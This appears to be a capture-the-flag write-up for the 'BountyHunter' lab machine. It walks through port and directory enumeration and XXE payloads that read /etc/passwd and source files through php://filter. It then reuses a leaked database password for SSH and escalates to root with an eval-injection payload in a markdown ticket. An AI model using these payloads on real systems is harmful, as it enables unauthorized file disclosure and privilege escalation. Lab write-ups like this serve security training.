# Enumeration

Starting with nmap
```bash
Nmap scan report for 10.10.11.100
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
```

Looking at port 80, we have a website with only one link which leads to portal.php. Navigating to the page, we see a message of under maintainance, and link to another page. 

### PORT 80
```bash
ffuf -u http://10.10.11.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -e .php                                                                                  
________________________________________________                                                                                                                         
 :: Method           : GET
 :: URL              : http://10.10.11.100/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405                                                                                              
__________________________________________                                                                                                                         
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
                        [Status: 200, Size: 25169, Words: 10028, Lines: 389]                                                                                       
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10]                                                                                             
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]                                                                                             
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]                                                                                             
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                                 
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]                                                                                       
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389]                                                                                       
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]                                                                                            
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6]                                                                                             
resources               [Status: 301, Size: 316, Words: 20, Lines: 10]                                                                                             
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
```

On basic enumeration, we found resource folder with directory listing on. It had couple of interesting files.

```
# File: Readme.txt
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```
Looking at the js files on the server, we saw one with source code 
```javascript
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```
The `/log_submit.php` initiate the above code, making an post requests to `tracker_diRbPr00f314.php` with the user input in XML form. Looking at code, it might be vulnerable to XXE attack.

Intercepting the request, our data was sent in base64 encoded form, which we can easily decode. Changing the data to our payload, and encode it with base64 and send. *(Initially, it will not work as our base64 data need to be url encoded too)*. 

Encoding the payloads and sending to server, we got our output
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'file:///etc/passwd'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```

We were able to extract content of passwd file, but not for any php code. *Maybe cause server is running php, so any php code, instead of displaying raw it executes it*. 

To exfil source code of any php file, we need to use php filters.
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [ <!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/db.php'>]>
		<bugreport>
		<title>&test;</title>
		<cwe>1</cwe>
		<cvss>1</cvss>
		<reward>1</reward>
		</bugreport>
```
We got the output, base64 decoding it gave us the source code
```php
// db.php file

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
We have a password and usernames from passwd file, we can try to ssh in the box. Indeed it worked.

## Shell as development
Grab the user.txt file.

Checking for sudo permission, we saw we can run
```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Looking at the script
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            print(ticketCode)
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                print(f"validation num: {validationNumber}")
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Here, the script looks for .md extension, and check the content of the files to be in specific order. But, looking at the code, we can see a line `validationNumber = eval(x.replace("**", ""))`. Eval function can be dangerous. Here we need to make a markdown file and eventually hit the eval function to get our malicious code to execute.

Markdown file can be created as follows:
```markdown
# Skytrain Inc
## Ticket to abc
__Ticket Code:__
**11+exec('''import os;os.system('/bin/bash -p')''')
```

Running the python script with above markdown file gave us Root :D
